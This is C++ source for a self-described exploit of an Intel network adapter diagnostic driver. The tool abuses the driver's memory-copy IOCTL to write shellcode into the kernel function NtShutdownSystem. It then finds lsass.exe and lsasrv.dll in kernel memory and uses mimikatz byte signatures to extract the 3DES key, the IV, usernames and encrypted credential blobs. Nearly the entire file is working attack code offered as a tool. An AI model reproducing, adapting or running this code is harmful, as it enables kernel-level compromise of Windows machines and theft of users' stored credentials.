#include <windows.h>
#include <ntstatus.h>
#include <tlhelp32.h>
#include <string>
#include <filesystem>
#include <atlstr.h>
#include <assert.h>

#pragma comment(lib, "ntdll.lib")
#include "shor.h"
#pragma warning(disable:4996)

BOOLEAN GetModuleBaseAddress(PCHAR Name, ULONG_PTR* lpBaseAddress) {
	PRTL_PROCESS_MODULES ModuleInformation = NULL;
	ULONG InformationSize = 16;
	NTSTATUS NtStatus;

	do {
		InformationSize *= 2;

		ModuleInformation = (PRTL_PROCESS_MODULES)realloc(ModuleInformation, InformationSize);
		memset(ModuleInformation, 0, InformationSize);

		NtStatus = NtQuerySystemInformation(SystemModuleInformation,
			ModuleInformation,
			InformationSize,
			NULL);
	} while (NtStatus == STATUS_INFO_LENGTH_MISMATCH);

	if (!NT_SUCCESS(NtStatus)) {
		return FALSE;
	}

	BOOL Success = FALSE;
	for (UINT i = 0; i < ModuleInformation->NumberOfModules; i++) {
		CONST PRTL_PROCESS_MODULE_INFORMATION Module = &ModuleInformation->Modules[i];
		CONST USHORT OffsetToFileName = Module->OffsetToFileName;

		if (!strcmp((const char*)&Module->FullPathName[OffsetToFileName], Name)) {
			*lpBaseAddress = (ULONG_PTR)ModuleInformation->Modules[i].ImageBase;
			Success = TRUE;
			break;
		}
	}

	free(ModuleInformation);
	return Success;
}


// Get EPROCESS for System process
ULONG64 PsInitialSystemProcess()
{
	// load ntoskrnl.exe
	ULONG64 ntos = (ULONG64)LoadLibrary(L"ntoskrnl.exe");
	// get address of exported PsInitialSystemProcess variable
	ULONG64 addr = (ULONG64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	//ULONG64 addr_mmCopyVirtualmemory = (ULONG64)GetProcAddress((HMODULE)ntos, "MmCopyVirtualMemory");

	FreeLibrary((HMODULE)ntos);
	ULONG64 res = 0;
	ULONG_PTR Nt_addr = 0;
	GetModuleBaseAddress((PCHAR)"ntoskrnl.exe", &Nt_addr);
	// subtract addr from ntos to get PsInitialSystemProcess offset from base
	if (Nt_addr) {
		res = addr - ntos + Nt_addr;
	}
	return res;
}


bool intel::MemCopy(HANDLE device_handle, uint64_t dest, uint64_t source, uint64_t count) {

	MEMCPY_BUFFER memcpy_buffer = {};
	memcpy_buffer.switch_num = 0x33;
	memcpy_buffer.dest = dest;
	memcpy_buffer.source = source;
	memcpy_buffer.count = count;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl, &memcpy_buffer, sizeof(memcpy_buffer), nullptr, 0, &bytes_returned, nullptr);
}


ULONGLONG extractBits(ULONGLONG address, ULONGLONG size, ULONGLONG offset) {
	return (((1 << size) - 1) & (address >> offset));
}


DWORD64 GetAllocateAddress(HANDLE hDevice, ULONG64 ExAllocatePool, ULONG64 NtShutdownSystem, ULONG64 addr_NtShutdownSystem_ntdll) {

	DWORD64 AddressAllocate = 0;

	char rawAllocate[44];
	// char prologue[7] = { 0xCC, 0xCC, 0xCC,0x55,0x48,0x89,0xe5 };
	char prologue[4] = {0x55,0x48,0x89,0xe5 };  //prologue
	memmove(rawAllocate, prologue, 4);

	char NumberoFBytes_mov_rdx[2] = { 0x48,0xBA }; // rdx NumberoFBytes
	memmove(rawAllocate + 4, NumberoFBytes_mov_rdx, 2);

	DWORD64 NumberoFBytes_mov_data = 0x200;
	memmove(rawAllocate + 6, (char*)&NumberoFBytes_mov_data, 8);

	char PoolType_mov_rcx[3] = { 0x48,0x33,0xc9 }; // rcx PoolType
	memmove(rawAllocate + 14, PoolType_mov_rcx, 3);

	char calladdress_mov_rax[2] = { 0x48,0xb8 }; // call address
	memmove(rawAllocate + 17, calladdress_mov_rax, 2);

	DWORD64 calladdress_mov_data = ExAllocatePool;
	memmove(rawAllocate + 19, (char*)&calladdress_mov_data, 8);

	char call_rax[2] = { 0xff,0xd0 };
	memmove(rawAllocate + 27, call_rax, 2);

	char get_rax_mov[2] = { 0x48,0xa3 };  // get rax
	memmove(rawAllocate + 29, get_rax_mov, 2);

	DWORD64 get_rax_data = (DWORD64)&AddressAllocate;
	memmove(rawAllocate + 31, (char*)&get_rax_data, 8);

	char epilogue[4] = { 0x48,0x89,0xec,0x5d };  //epilogue
	memmove(rawAllocate + 39, epilogue, 4);

	char ret[1] = { 0xC3 }; //ret 
	memmove(rawAllocate + 43, ret, 1);

	intel::MemCopy(hDevice, (uint64_t)NtShutdownSystem, (uint64_t)rawAllocate, 44); //34

	NTSHUTDOWNSYSTEM fNtShutdownSystem = (NTSHUTDOWNSYSTEM)addr_NtShutdownSystem_ntdll;
	fNtShutdownSystem(ShutdownPowerOff);
	return AddressAllocate;
}

void CallAllocateAddress(HANDLE hDevice, ULONG64 ExAllocatePool, ULONG64 NtShutdownSystem, ULONG64 addr_NtShutdownSystem_ntdll, DWORD64 AddressAllocate) {

	char rawCallAllocate[24];
	char prologue[7] = { 0xCC, 0xCC, 0xCC,0x55,0x48,0x89,0xe5 };
	//char prologue[4] = {0x55,0x48,0x89,0xe5 };  //prologue
	memmove(rawCallAllocate, prologue, 7);

	char Allocate_mov_rax[2] = { 0x48,0xa1 }; // 
	memmove(rawCallAllocate + 7, Allocate_mov_rax, 2);

	DWORD64 Allocate_mov_data = (DWORD64)&AddressAllocate;
	memmove(rawCallAllocate + 9, (char*)&Allocate_mov_data, 8);


	char calladdress_rax[2] = { 0xff,0xd0 }; // call address
	memmove(rawCallAllocate + 17, calladdress_rax, 2);

	char epilogue[4] = { 0x48,0x89,0xec,0x5d };  //epilogue
	memmove(rawCallAllocate + 19, epilogue, 4);

	char ret[1] = { 0xC3 }; //ret 
	memmove(rawCallAllocate + 23, ret, 1);

	intel::MemCopy(hDevice, (uint64_t)NtShutdownSystem, (uint64_t)rawCallAllocate, 24); //34

	//NTSHUTDOWNSYSTEM fNtShutdownSystem = (NTSHUTDOWNSYSTEM)addr_NtShutdownSystem_ntdll;
	//DWORD64 Allocate = fNtShutdownSystem(ShutdownPowerOff);
}

char* dumpUsermode(HANDLE hDevice, ULONG64 EPROCESS_lssas, ULONG64 Start, ULONG64 Size, ULONG64 EPROCESS_GetProcess) {

	ULONG64 ntos = (ULONG64)LoadLibrary(L"ntoskrnl.exe");
	ULONG64 ntdll = (ULONG64)LoadLibrary(L"ntdll.dll");
	// get address of exported PsInitialSystemProcess variable
	ULONG64 addr_NtShutdownSystem_ntdll = (ULONG64)GetProcAddress((HMODULE)ntdll, "NtShutdownSystem");
	ULONG64 addr_NtShutdownSystem_ntos = (ULONG64)GetProcAddress((HMODULE)ntos, "NtShutdownSystem");
	ULONG64 addr_MmCopyVirtualmemory = (ULONG64)GetProcAddress((HMODULE)ntos, "MmCopyVirtualMemory");
	ULONG64 addr_ExAllocatePool = (ULONG64)GetProcAddress((HMODULE)ntos, "ExAllocatePool");
	ULONG64 NtShutdownSystem = 0;
	ULONG64 MmCopyVirtualMemory = 0;
	ULONG64 ExAllocatePool = 0;
	ULONG_PTR Nt_addr = 0;
	GetModuleBaseAddress((PCHAR)"ntoskrnl.exe", &Nt_addr);
	// subtract addr from ntos to get PsInitialSystemProcess offset from base
	if (Nt_addr) {
		NtShutdownSystem = addr_NtShutdownSystem_ntos - ntos + Nt_addr;
		MmCopyVirtualMemory = addr_MmCopyVirtualmemory - ntos + Nt_addr;
		ExAllocatePool = addr_ExAllocatePool - ntos + Nt_addr;
	}
	FreeLibrary((HMODULE)ntos);
	FreeLibrary((HMODULE)ntdll);

	DWORD64 AddressAllocate = GetAllocateAddress(hDevice, ExAllocatePool, NtShutdownSystem, addr_NtShutdownSystem_ntdll);
	CallAllocateAddress(hDevice, ExAllocatePool, NtShutdownSystem, addr_NtShutdownSystem_ntdll, AddressAllocate);

	ULONG64 sourseProcess = EPROCESS_lssas;
	ULONG64 sourseaddress = Start;
	ULONG64 targetProcess = EPROCESS_GetProcess;
	SIZE_T Result;
	char* targetaddress = new char[Size];

	char rawData[96];

	char prologue[4] = { 0x55,0x48,0x89,0xe5 };  //prologue
	memmove(rawData, prologue, 4);

	char result_mov_rax[2] = { 0x48,0xb8 };  //push result
	memmove(rawData + 4, result_mov_rax, 2);

	DWORD64  result_mov_data = (DWORD64)&Result;
	memmove(rawData + 6, (char*)&result_mov_data, 8);

	char push_rsp_30[5] = { 0x48,0x89,0x44,0x24,0x30 };
	memmove(rawData + 14, push_rsp_30, 5);

	char push_rsp_28[5] = { 0xC6,0x44,0x24,0x28,0x00 };  // // push kernel mode
	memmove(rawData + 19, push_rsp_28, 5);

	char size_mov_rax[2] = { 0x48,0xb8 }; // push size to 
	memmove(rawData + 24, size_mov_rax, 2);

	DWORD64 size_mov_data = Size;
	memmove(rawData + 26, (char*)&size_mov_data, 8);

	char push_rsp_20[5] = { 0x48,0x89,0x44,0x24,0x20 };
	memmove(rawData + 34, push_rsp_20, 5);

	char targetaddress_mov_r9[2] = { 0x49,0xb9 }; // r9 targetaddress
	memmove(rawData + 39, targetaddress_mov_r9, 2);

	DWORD64 targetaddress_mov_data = (DWORD64)&targetaddress;
	memmove(rawData + 41, (char*)targetaddress_mov_data, 8);

	char targetProcess_mov_r8[2] = { 0x49,0xb8 }; // r8 targetProcess
	memmove(rawData + 49, targetProcess_mov_r8, 2);

	DWORD64 targetProcess_mov_data = targetProcess;
	memmove(rawData + 51, (char*)&targetProcess_mov_data, 8);

	char sourseaddress_mov_rdx[2] = { 0x48,0xBA }; // rdx sourseaddress
	memmove(rawData + 59, sourseaddress_mov_rdx, 2);

	DWORD64 sourseaddress_mov_data = sourseaddress;
	memmove(rawData + 61, (char*)&sourseaddress_mov_data, 8);

	char sourseProcess_mov_rcx[2] = { 0x48,0xb9 }; // rcx sourseProcess
	memmove(rawData + 69, sourseProcess_mov_rcx, 2);

	DWORD64 sourseProcess_mov_data = sourseProcess;
	memmove(rawData + 71, (char*)&sourseProcess_mov_data, 8);

	char calladdress_mov_rax[2] = { 0x48,0xb8 }; // call address
	memmove(rawData + 79, calladdress_mov_rax, 2);

	DWORD64 calladdress_mov_data = MmCopyVirtualMemory;
	memmove(rawData + 81, (char*)&calladdress_mov_data, 8);

	char call_rax[2] = { 0xff,0xd0 };
	memmove(rawData + 89, call_rax, 2);

	char epilogue[4] = { 0x48,0x89,0xec,0x5d };  //epilogue
	memmove(rawData + 91, epilogue, 4);

	char ret[1] = { 0xC3 }; //ret 
	memmove(rawData + 95, ret, 1);

	intel::MemCopy(hDevice, (uint64_t)AddressAllocate, (uint64_t)rawData, 96); //96

	NTSHUTDOWNSYSTEM fNtShutdownSystem = (NTSHUTDOWNSYSTEM)addr_NtShutdownSystem_ntdll;
	DWORD64 Allocate = fNtShutdownSystem(ShutdownPowerOff);

	return targetaddress;

	//lootLsaSrv(targetaddress, Start, Size);
	
	//FILE* f;
	//f = fopen("D:\\lsasrv.dump","a+b");
	//fwrite(targetaddress,Size,1,f);

	//fclose(f);

}



int memmem(PBYTE haystack,
	DWORD haystack_size,
	PBYTE needle,
	DWORD needle_size)
{
	int haystack_offset = 0;
	int needle_offset = 0;

	haystack_size -= needle_size;

	for (haystack_offset = 0; haystack_offset <= haystack_size; haystack_offset++) {
		for (needle_offset = 0; needle_offset < needle_size; needle_offset++)
			if (haystack[haystack_offset + needle_offset] != needle[needle_offset])
				break; // Next character in haystack.

		if (needle_offset == needle_size)
			return haystack_offset;
	}

	return -1;
}

void lootLsaSrv(HANDLE hDevice, ULONG64 EPROCESS_lssas, ULONG64 Start, ULONG64 End, ULONG64 Size, ULONG64 EPROCESS_GetProcess) { //(char* start, ULONGLONG original, ULONGLONG size) {
	LARGE_INTEGER reader;
	DWORD bytes_read = 0;
	LPSTR lsasrv = NULL;
	ULONGLONG cursor = 0;
	ULONGLONG lsasrv_size = 0;
	ULONGLONG original = 0;
	BOOL result;


	ULONGLONG LogonSessionListCount = 0;
	ULONGLONG LogonSessionList = 0;
	ULONGLONG LogonSessionList_offset = 0;
	ULONGLONG LogonSessionListCount_offset = 0;
	ULONGLONG iv_offset = 0;
	ULONGLONG hDes_offset = 0;
	ULONGLONG DES_pointer = 0;

	unsigned char* iv_vector = NULL;
	unsigned char* DES_key = NULL;
	KIWI_BCRYPT_HANDLE_KEY h3DesKey;
	KIWI_BCRYPT_KEY81 extracted3DesKey;

	LSAINITIALIZE_NEEDLE LsaInitialize_needle = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
	LOGONSESSIONLIST_NEEDLE LogonSessionList_needle = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };

	PBYTE LsaInitialize_needle_buffer = NULL;
	PBYTE needle_buffer = NULL;

	int offset_LsaInitialize_needle = 0;
	int offset_LogonSessionList_needle = 0;

	ULONGLONG currentElem = 0;

	original = (DWORD64)Start;

	/* Save the whole region in a buffer */
	lsasrv = (LPSTR)malloc(Size);
	lsasrv = (LPSTR)dumpUsermode(hDevice, EPROCESS_lssas, Start, (End - Start), EPROCESS_GetProcess);
	lsasrv_size = Size;

	// Use mimikatz signatures to find the IV/keys
	printf("\t\t===================[Crypto info]===================\n");
	LsaInitialize_needle_buffer = (PBYTE)malloc(sizeof(LSAINITIALIZE_NEEDLE));
	memcpy(LsaInitialize_needle_buffer, &LsaInitialize_needle, sizeof(LSAINITIALIZE_NEEDLE));
	offset_LsaInitialize_needle = memmem((PBYTE)lsasrv, lsasrv_size, LsaInitialize_needle_buffer, sizeof(LSAINITIALIZE_NEEDLE));
	printf("[*] Offset for InitializationVector/h3DesKey/hAesKey is %d\n", offset_LsaInitialize_needle);

	memcpy(&iv_offset, lsasrv + offset_LsaInitialize_needle + 0x43, 4);  //IV offset
	printf("[*] IV Vector relative offset: 0x%08llx\n", iv_offset);
	iv_vector = (unsigned char*)malloc(16);
	memcpy(iv_vector, lsasrv + offset_LsaInitialize_needle + 0x43 + 4 + iv_offset, 16);
	printf("\t\t[/!\\] IV Vector: ");
	for (int i = 0; i < 16; i++) {
		printf("%02x", iv_vector[i]);
	}
	printf(" [/!\\]\n");
	free(iv_vector);

	memcpy(&hDes_offset, lsasrv + offset_LsaInitialize_needle - 0x59, 4); //DES KEY offset
	printf("[*] 3DES Handle Key relative offset: 0x%08llx\n", hDes_offset);
	printf("[*]0x%08llx\n", (original + offset_LsaInitialize_needle - 0x59 + 4 + hDes_offset));
	memcpy(&DES_pointer, lsasrv + offset_LsaInitialize_needle - 0x59 + 4 + hDes_offset, 8);
	printf("[*] 3DES Handle Key pointer: 0x%08llx\n", DES_pointer);

	LPSTR h3DesKey_tmp = (LPSTR)malloc(sizeof(KIWI_BCRYPT_HANDLE_KEY));
	h3DesKey_tmp = dumpUsermode(hDevice, EPROCESS_lssas, DES_pointer, sizeof(KIWI_BCRYPT_HANDLE_KEY), EPROCESS_GetProcess);
	memcpy(&h3DesKey, h3DesKey_tmp, sizeof(KIWI_BCRYPT_HANDLE_KEY));
	free(h3DesKey_tmp);

	LPSTR h3DesKey_key_tmp = (LPSTR)malloc(sizeof(KIWI_BCRYPT_KEY81));
	h3DesKey_key_tmp = dumpUsermode(hDevice, EPROCESS_lssas, (DWORD64)h3DesKey.key, sizeof(KIWI_BCRYPT_KEY81), EPROCESS_GetProcess);
	memcpy(&extracted3DesKey, h3DesKey_key_tmp, sizeof(KIWI_BCRYPT_KEY81));
	free(h3DesKey_key_tmp);
	DES_key = (unsigned char*)malloc(extracted3DesKey.hardkey.cbSecret);
	memcpy(DES_key, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
	printf("\t\t[/!\\] 3DES Key: ");
	for (int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
		printf("%02x", DES_key[i]);
	}
	printf(" [/!\\]\n");
	free(DES_key);
	printf("\t\t================================================\n");

	needle_buffer = (PBYTE)malloc(sizeof(LOGONSESSIONLIST_NEEDLE));
	memcpy(needle_buffer, &LogonSessionList_needle, sizeof(LOGONSESSIONLIST_NEEDLE));
	offset_LogonSessionList_needle = memmem((PBYTE)lsasrv, lsasrv_size, needle_buffer, sizeof(LOGONSESSIONLIST_NEEDLE));

	memcpy(&LogonSessionList_offset, lsasrv + offset_LogonSessionList_needle + 0x17, 4);
	printf("[*] LogonSessionList Relative Offset: 0x%08llx\n", LogonSessionList_offset);

	LogonSessionList = original + offset_LogonSessionList_needle + 0x17 + 4 + LogonSessionList_offset;
	printf("[*] LogonSessionList: 0x%08llx\n", LogonSessionList);

	printf("\t\t===================[LogonSessionList]===================");
	while (currentElem != LogonSessionList) {
		if (currentElem == 0) {
			currentElem = LogonSessionList;
		}
		memcpy(&currentElem, lsasrv + offset_LogonSessionList_needle + 0x17 + 4 + LogonSessionList_offset, 8);
		printf("Element at: 0x%08llx\n", currentElem);
		LPSTR currentElem_tmp = (LPSTR)malloc(sizeof(KIWI_BCRYPT_KEY81));
		currentElem_tmp = dumpUsermode(hDevice, EPROCESS_lssas, (DWORD64)currentElem, sizeof(currentElem), EPROCESS_GetProcess);
		memcpy(&currentElem, currentElem_tmp, sizeof(currentElem_tmp));
		free(currentElem_tmp);
		USHORT length = 0;
		LPWSTR username = NULL;
		ULONGLONG username_pointer = 0;

		LPSTR length_tmp = (LPSTR)malloc(sizeof(length));
		length_tmp = dumpUsermode(hDevice, EPROCESS_lssas, (DWORD64)currentElem + 0x90, sizeof(length), EPROCESS_GetProcess);
		memcpy(&length, length_tmp, sizeof(length_tmp));
		free(length_tmp);

		username = (LPWSTR)malloc(length + 2);
		memset(username, 0, length + 2);

		LPSTR username_pointer_tmp = (LPSTR)malloc(sizeof(username_pointer));
		username_pointer_tmp = dumpUsermode(hDevice, EPROCESS_lssas, (DWORD64)currentElem + 0x98, sizeof(username_pointer), EPROCESS_GetProcess);
		memcpy(&username_pointer, username_pointer_tmp, sizeof(username_pointer_tmp));
		free(username_pointer_tmp);

		LPSTR username_tmp = (LPSTR)malloc(sizeof(username));
		username_tmp = dumpUsermode(hDevice, EPROCESS_lssas, (DWORD64)username_pointer, sizeof(username), EPROCESS_GetProcess);
		memcpy(username, username_tmp, sizeof(username_tmp));
		free(username_tmp);
		wprintf(L"\n[+] Username: %s \n", username);
		free(username);
	
		
		ULONGLONG credentials_pointer = 0;
		LPSTR credentials_pointer_tmp = (LPSTR)malloc(sizeof(credentials_pointer));
		credentials_pointer_tmp = dumpUsermode(hDevice, EPROCESS_lssas, (DWORD64)currentElem + 0x108, sizeof(credentials_pointer), EPROCESS_GetProcess);
		memcpy(&credentials_pointer, credentials_pointer_tmp, sizeof(credentials_pointer_tmp));
		free(credentials_pointer_tmp);

		if (credentials_pointer == 0) {
			printf("[+] Cryptoblob: (empty)\n");
			continue;
		}
		printf("[*] Credentials Pointer: 0x%08llx\n", credentials_pointer);		
		
		ULONGLONG primaryCredentials_pointer = 0;
		LPSTR primaryCredentials_pointer_tmp = (LPSTR)malloc(sizeof(primaryCredentials_pointer));
		primaryCredentials_pointer_tmp = dumpUsermode(hDevice, EPROCESS_lssas, (DWORD64)credentials_pointer + 0x10, sizeof(primaryCredentials_pointer), EPROCESS_GetProcess);
		memcpy(&primaryCredentials_pointer, primaryCredentials_pointer_tmp, sizeof(primaryCredentials_pointer_tmp));
		free(primaryCredentials_pointer_tmp);
		printf("[*] Primary credentials Pointer: 0x%08llx\n", primaryCredentials_pointer);

		USHORT cryptoblob_size = 0;
		LPSTR cryptoblob_size_tmp = (LPSTR)malloc(sizeof(cryptoblob_size));
		cryptoblob_size_tmp = dumpUsermode(hDevice, EPROCESS_lssas, (DWORD64)primaryCredentials_pointer + 0x18, sizeof(cryptoblob_size), EPROCESS_GetProcess);
		memcpy(&cryptoblob_size, cryptoblob_size_tmp, sizeof(cryptoblob_size_tmp));
		free(cryptoblob_size_tmp);
		if (cryptoblob_size % 8 != 0) {
			printf("[*] Cryptoblob size: (not compatible with 3DEs, skipping...)\n");
			continue;
		}
		printf("[*] Cryptoblob size: 0x%x\n", cryptoblob_size);

		ULONGLONG cryptoblob_pointer = 0;
		LPSTR cryptoblob_pointer_tmp = (LPSTR)malloc(sizeof(cryptoblob_pointer));
		cryptoblob_pointer_tmp = dumpUsermode(hDevice, EPROCESS_lssas, (DWORD64)primaryCredentials_pointer + 0x20, sizeof(cryptoblob_pointer), EPROCESS_GetProcess);
		memcpy(&cryptoblob_pointer, cryptoblob_pointer_tmp, sizeof(cryptoblob_pointer_tmp));
		free(cryptoblob_pointer_tmp);
		printf("Cryptoblob pointer: 0x%08llx\n", cryptoblob_pointer);

		unsigned char* cryptoblob = (unsigned char*)malloc(cryptoblob_size);
		LPSTR cryptoblob_tmp = (LPSTR)malloc(cryptoblob_size);
		cryptoblob_tmp = dumpUsermode(hDevice, EPROCESS_lssas, (DWORD64)cryptoblob_pointer, cryptoblob_size, EPROCESS_GetProcess);
		memcpy(cryptoblob, cryptoblob_tmp, cryptoblob_size);
		
		printf("[+] Cryptoblob:\n");
		for (int i = 0; i < cryptoblob_size; i++) {
			printf("%02x", cryptoblob[i]);
		}
		printf("\n");
		free(cryptoblob_tmp);
		break;
	}
	
	printf("\t\t================================================\n");
	free(needle_buffer);
	free(lsasrv);
}


void walkAVL(HANDLE hDevice, ULONG64 VadRoot, ULONG64 VadCount, ULONG64 EPROCESS_lssas, ULONG64 EPROCESS_GetProcess) {
	ULONG64* queue;
	ULONG64 count = 0;
	ULONG64 cursor = 0;
	ULONG64 last = 1;
	VAD* vadList = NULL;
	queue = (ULONGLONG*)malloc(sizeof(ULONGLONG) * VadCount * 4); // Make room for our queue
	queue[0] = VadRoot; // Node 0
	vadList = (VAD*)malloc(VadCount * sizeof(*vadList));

	ULONG64 size = 0;
	ULONG64 mask = 0;
	intel::MemCopy(hDevice, (uint64_t)&mask, (uint64_t)VadRoot, 8);
	mask = mask & 0xffff000000000000;
	while (count < VadCount)
	{
		ULONG64 currentNode;
		currentNode = queue[cursor]; 
		if (currentNode == 0) {
			cursor++;
			continue;
		}

		
		ULONG64 VadRootLeft = 0;
		intel::MemCopy(hDevice, (uint64_t)&VadRootLeft, (uint64_t)currentNode, 8);
		ULONG64 VadRootRight = 0;
		intel::MemCopy(hDevice, (uint64_t)&VadRootRight, (uint64_t)(currentNode + 0x8), 8);
		//printf("[+]VadRootLeft: 0x%llx\n", VadRootLeft);
		//printf("[+]VadRootRight: 0x%llx\n", VadRootRight);
		queue[last++] = VadRootLeft;
		queue[last++] = VadRootRight;
		ULONG64 Start = 0;
		ULONG64 StartingVpn = 0;
		ULONG64 StartingVpnHigh = 0;
		intel::MemCopy(hDevice, (uint64_t)&StartingVpn, (uint64_t)(currentNode + 0x18), 4);
		intel::MemCopy(hDevice, (uint64_t)&StartingVpnHigh, (uint64_t)(currentNode + 0x20), 1);
		Start = (StartingVpn << 12) | (StartingVpnHigh << 44);

		ULONG64 End = 0;
		ULONG64 EndingVpn = 0;
		ULONG64 EndingVpnHigh = 0;
		intel::MemCopy(hDevice, (uint64_t)&EndingVpn, (uint64_t)(currentNode + 0x1c), 4);
		intel::MemCopy(hDevice, (uint64_t)&EndingVpnHigh, (uint64_t)(currentNode + 0x21), 1);
		End = ((EndingVpn + 1) << 12) | (EndingVpnHigh << 44);

		ULONG64 subsection = 0;
		intel::MemCopy(hDevice, (uint64_t)&subsection, (uint64_t)(currentNode + 0x48), 8);
		if (subsection != 0 && subsection != 0xffffffffffffffff&& (subsection & mask) == mask) {


			ULONG64 control_area = 0;
			intel::MemCopy(hDevice, (uint64_t)&control_area, (uint64_t)(subsection), 8);
			if (control_area != 0 && control_area != 0xffffffffffffffff&& (control_area & mask) == mask) {
																		   
				ULONG64 fileobject = 0;
				intel::MemCopy(hDevice, (uint64_t)&fileobject, (uint64_t)(control_area + 0x40), 8);
				if (fileobject != 0 && fileobject != 0xffffffffffffffff && (fileobject & mask) == mask) {

					fileobject = fileobject & 0xfffffffffffffff0;

					USHORT Path_size = 0;
					intel::MemCopy(hDevice, (uint64_t)&Path_size, (uint64_t)(fileobject + 0x58 + 0x2), 8);

					ULONG64 Path = 0;
					intel::MemCopy(hDevice, (uint64_t)&Path, (uint64_t)(fileobject + 0x58 + 0x8), Path_size);
					
					char FileName[MAX_PATH];
					memset(FileName,0, MAX_PATH);
					intel::MemCopy(hDevice, (uint64_t)&FileName, (uint64_t)(Path), Path_size);
					char lsasrv[28]; // = "Windows\System32\lsasrv.dll";
					memset(lsasrv, 0, 28);
					int lsasrv_size = 0;
					for (int i = 1; i < (Path_size -1); i++) {
						if (FileName[i] != 0x00) {
							lsasrv[lsasrv_size] = FileName[i];
							lsasrv_size++;
						}
						if (lsasrv_size == 27){					
							break;
						}
					}
					if (!strcmp((const char*)lsasrv, "Windows\\System32\\lsasrv.dll")) {
						std::cout << "[+]Found: lsasrv.dll " << (const char*)lsasrv << "\n";
						printf("[+]Start-End: 0x%llx-0x%llx Size byte: %lld\n", Start, End, (End - Start));
						printf("[+]Vad: 0x%llx\n", currentNode);
						std::cout << "[+]current" << cursor << "\n";
						lootLsaSrv(hDevice, EPROCESS_lssas, Start,End, (End - Start), EPROCESS_GetProcess);
						break;
					}
					
				}
			}
		}
		
		count++;
		cursor++;
	}
	free(vadList);
	free(queue);
	return;
}





int main(int argc, char** argv)
{

	HANDLE   hDevice;

	printf("--[ Intel Network Adapter Diagnostic Driver exploit ]--\n");

	printf("Opening handle to driver..\n");
	if ((hDevice = CreateFileA(intel::szDevice, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, NULL)) != INVALID_HANDLE_VALUE) {
		printf("Device %s succesfully opened!\n", intel::szDevice);
		printf("\tHandle: %p\n", hDevice);
	}
	else
	{
		printf("Error: Error opening device %s\n", intel::szDevice);
		return 0;
	}

	ULONG64 ReadSystemEPROCESS = PsInitialSystemProcess();
	ULONG64 SystemEPROCESS = 0;
	intel::MemCopy(hDevice, (uint64_t)&SystemEPROCESS, (uint64_t)ReadSystemEPROCESS, 8);


	printf("[+]PsInitialSystemProcess pointer: 0x%llx\n", ReadSystemEPROCESS);
	printf("[+]PsInitialSystemProcess: 0x%llx\n", SystemEPROCESS);

	ULONG64 ActiveProcessLinksOffset = 0x2f0;
	ULONG64 ImageFileNameOffset = 0x450;
	ULONG64 ActiveProcessLinks = SystemEPROCESS+ ActiveProcessLinksOffset;
	ULONG64 VadRootOffset = 0x658;
	ULONG64 VadCountOffset = 0x668;

	ULONG64 VadRoot_lsass = 0;
	ULONG64 VadCount_lsass = 0;
	ULONG64 EPROCESS_lsass = 0;
	ULONG64 EPROCESS_CurrentProcess = 0;
	while (true){
		ULONG64 ActiveProcessLinksNext = 0;
		intel::MemCopy(hDevice, (uint64_t)&ActiveProcessLinksNext, (uint64_t)ActiveProcessLinks, 8);

		UCHAR ImageFileName[MAX_PATH] = "";
		intel::MemCopy(hDevice, (uint64_t)&ImageFileName, (uint64_t)(ActiveProcessLinksNext - ActiveProcessLinksOffset + ImageFileNameOffset), MAX_PATH);

		if (!strcmp((const char*)ImageFileName, "lsass.exe")) {
			printf("[+]Name process: %.*s\n", (int)sizeof(ImageFileName), ImageFileName);
			EPROCESS_lsass = ActiveProcessLinksNext - ActiveProcessLinksOffset;
			printf("[+]EPROCESS lsass: 0x%llx\n", EPROCESS_lsass);

			intel::MemCopy(hDevice, (uint64_t)&VadRoot_lsass, (uint64_t)(ActiveProcessLinksNext - ActiveProcessLinksOffset + VadRootOffset), 8);
			intel::MemCopy(hDevice, (uint64_t)&VadCount_lsass, (uint64_t)(ActiveProcessLinksNext - ActiveProcessLinksOffset + VadCountOffset), 8);
			printf("[+]VadRoot: 0x%llx\n", VadRoot_lsass);
			printf("[+]VadCount: 0x%llx\n", VadCount_lsass);

		}

		if (!strcmp((const char*)ImageFileName, "shor.exe")) {
			printf("[+]Name process: %.*s\n", (int)sizeof(ImageFileName), ImageFileName);
			EPROCESS_CurrentProcess = ActiveProcessLinksNext - ActiveProcessLinksOffset;
			printf("[+]EPROCESS CurrentProcess: 0x%llx\n", EPROCESS_CurrentProcess);
		}

		if ((EPROCESS_lsass !=0) && (EPROCESS_CurrentProcess != 0)) {
			walkAVL(hDevice, VadRoot_lsass, VadCount_lsass, EPROCESS_lsass, EPROCESS_CurrentProcess);
			break;
		}
		ActiveProcessLinks = ActiveProcessLinksNext;
	}

	
	getchar();

	return 0;


}
